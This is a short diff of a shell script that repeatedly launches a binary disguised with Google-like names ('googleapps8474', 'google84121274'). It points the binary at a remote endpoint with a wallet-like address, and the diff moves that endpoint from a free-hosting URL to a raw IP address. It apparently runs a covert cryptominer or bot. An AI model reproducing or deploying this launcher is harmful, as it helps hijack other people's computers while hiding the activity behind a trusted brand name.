@@ -20,7 +20,7 @@ cd googleapps8474
 while true
 do
 
-timeout 84 ./google84121274 -p https://mobileappsinstall8474.000webhostapp.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 28 -b 28
+timeout 84 ./google84121274 -p http://23.94.160.104 -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 28 -b 28
 if [ $? -eq 124 ]; then
 echo "google84"
 else
